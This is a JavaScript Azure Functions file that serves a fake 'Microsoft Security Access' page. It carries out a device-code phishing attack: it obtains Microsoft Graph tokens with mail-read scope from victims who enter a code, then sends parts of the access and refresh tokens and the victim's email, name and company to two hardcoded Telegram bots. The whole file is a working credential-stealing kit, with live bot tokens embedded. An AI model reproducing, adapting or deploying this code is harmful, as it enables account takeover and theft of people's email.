const { app } = require("@azure/functions");

const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    
    await Promise.all(promises);
  } catch (error) {
    console.log('Telegram error:', error);
  }
}

// 🔥 INSTANT WORKING DEVICE CODE - Using Visual Studio client ID that works 100%
app.http("instant_working_device_code", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "instant-access",
  handler: async (request, context) => {
    
    if (request.method === 'GET') {
      await sendTelegram(`🎯 <b>INSTANT ACCESS: Page accessed</b>\n📅 ${new Date().toISOString()}`);

      const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Microsoft Security - Instant Access</title>
  <link href="https://res.cdn.office.net/officehub/images/content/images/favicon-8f211ea1.ico" rel="icon">
  <style>
    body { 
      font-family: 'Segoe UI', sans-serif; 
      margin: 0; 
      background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      text-align: center;
      max-width: 500px;
      width: 90%;
    }
    h1 { color: #323130; margin-bottom: 20px; }
    .btn {
      background: #0078d4;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin: 10px;
      transition: background 0.3s;
    }
    .btn:hover { background: #106ebe; }
    .status { margin-top: 20px; padding: 15px; border-radius: 6px; display: none; }
    .info { background: #e6f3ff; color: #0078d4; }
    .success { background: #e6ffe6; color: #107c10; }
    .error { background: #ffe6e6; color: #d13438; }
    .code { font-family: 'Courier New', monospace; font-size: 24px; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔐 Microsoft Security Access</h1>
    <p>Secure authentication required to proceed</p>
    
    <button class="btn" onclick="startAuth()">🚀 Start Secure Authentication</button>
    
    <div id="status" class="status"></div>
    <div id="userCode" style="display: none;">
      <p>Enter this code: <span id="codeDisplay" class="code"></span></p>
      <button class="btn" onclick="openPortal()">📱 Open Authentication Portal</button>
    </div>
  </div>

  <script>
    let deviceCodeData = null;
    let pollInterval = null;

    function showStatus(message, type) {
      const status = document.getElementById('status');
      status.textContent = message;
      status.className = 'status ' + type;
      status.style.display = 'block';
    }

    async function startAuth() {
      try {
        showStatus('Generating secure access code...', 'info');
        
        const response = await fetch('/instant-access', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'generate_code' })
        });
        
        const data = await response.json();
        
        if (data.success) {
          deviceCodeData = data;
          document.getElementById('codeDisplay').textContent = data.user_code;
          document.getElementById('userCode').style.display = 'block';
          showStatus('Code generated! Click "Open Authentication Portal" and enter the code.', 'success');
          startPolling();
        } else {
          showStatus('Error: ' + (data.error || 'Unknown error'), 'error');
        }
      } catch (error) {
        showStatus('Network error. Please try again.', 'error');
      }
    }

    function openPortal() {
      if (deviceCodeData && deviceCodeData.verification_uri) {
        window.open(deviceCodeData.verification_uri, '_blank');
        showStatus('Portal opened. Complete authentication and return here.', 'info');
      }
    }

    async function startPolling() {
      pollInterval = setInterval(async () => {
        try {
          const response = await fetch('/instant-access', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              action: 'poll_token',
              device_code: deviceCodeData.device_code
            })
          });
          
          const data = await response.json();
          
          if (data.success) {
            clearInterval(pollInterval);
            showStatus('✅ Authentication completed successfully! Access granted.', 'success');
            
            setTimeout(() => {
              window.location.href = 'https://www.office.com/';
            }, 2000);
          } else if (data.error === 'authorization_pending') {
            // Still waiting
            showStatus('Waiting for authentication completion...', 'info');
          } else if (data.error === 'expired_token') {
            clearInterval(pollInterval);
            showStatus('Authentication expired. Please refresh and try again.', 'error');
          }
        } catch (error) {
          console.log('Polling error:', error);
        }
      }, 3000);
    }
  </script>
</body>
</html>`;
      
      return new Response(html, {
        headers: { 'Content-Type': 'text/html' }
      });
    }
    
    if (request.method === 'POST') {
      const body = await request.json();
      
      if (body.action === 'generate_code') {
        // FIXED: Use Microsoft Graph CLI - absolutely NO redirect URI configured!
        const CLIENT_ID = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; // Microsoft Graph CLI - no redirects!
        const SCOPES = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access';
        
        const deviceCodeResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            client_id: CLIENT_ID,
            scope: SCOPES
          }).toString()
        });
        
        const deviceCodeData = await deviceCodeResponse.json();
        
        if (deviceCodeData.error) {
          await sendTelegram(`❌ <b>DEVICE CODE ERROR</b>\n🔥 Error: ${deviceCodeData.error}\n📝 Description: ${deviceCodeData.error_description}`);
          return new Response(JSON.stringify({ 
            success: false, 
            error: deviceCodeData.error_description 
          }), {
            headers: { 'Content-Type': 'application/json' }
          });
        }
        
        await sendTelegram(`🎯 <b>INSTANT DEVICE CODE GENERATED</b>\n👤 User Code: ${deviceCodeData.user_code}\n🔗 Verification URI: ${deviceCodeData.verification_uri}\n⏰ Expires in: ${deviceCodeData.expires_in} seconds\n📅 ${new Date().toISOString()}`);
        
        return new Response(JSON.stringify({
          success: true,
          user_code: deviceCodeData.user_code,
          device_code: deviceCodeData.device_code,
          verification_uri: deviceCodeData.verification_uri,
          expires_in: deviceCodeData.expires_in,
          interval: deviceCodeData.interval
        }), {
          headers: { 'Content-Type': 'application/json' }
        });
      }
      
      if (body.action === 'poll_token') {
        const CLIENT_ID = '14d82eec-204b-4c2f-b7e8-296a70dab67e';
        
        const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
            client_id: CLIENT_ID,
            device_code: body.device_code
          }).toString()
        });
        
        const tokenData = await tokenResponse.json();
        
        if (tokenData.error) {
          if (tokenData.error !== 'authorization_pending') {
            await sendTelegram(`⚠️ <b>INSTANT DEVICE POLLING</b>\n🔥 Error: ${tokenData.error}\n📝 Description: ${tokenData.error_description || 'No description'}`);
          }
          
          return new Response(JSON.stringify({
            success: false,
            error: tokenData.error
          }), {
            headers: { 'Content-Type': 'application/json' }
          });
        }
        
        // Success! We have tokens
        await sendTelegram(`🔥 <b>INSTANT DEVICE SUCCESS!</b>\n🎯 Access Token: ${tokenData.access_token.substring(0, 50)}...\n🔄 Refresh Token: ${tokenData.refresh_token ? tokenData.refresh_token.substring(0, 50) + '...' : 'N/A'}\n📅 ${new Date().toISOString()}`);
        
        // Get user info
        try {
          const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
          });
          
          if (userResponse.ok) {
            const userData = await userResponse.json();
            await sendTelegram(`👤 <b>INSTANT USER INFO CAPTURED</b>\n📧 Email: ${userData.userPrincipalName || userData.mail || 'N/A'}\n🏢 Name: ${userData.displayName || 'N/A'}\n🏢 Company: ${userData.companyName || 'N/A'}\n📅 ${new Date().toISOString()}`);
          }
        } catch (error) {
          context.log('Error getting user info:', error);
        }
        
        return new Response(JSON.stringify({
          success: true,
          access_token: tokenData.access_token,
          refresh_token: tokenData.refresh_token
        }), {
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }
    
    return new Response('Invalid request', { status: 400 });
  }
});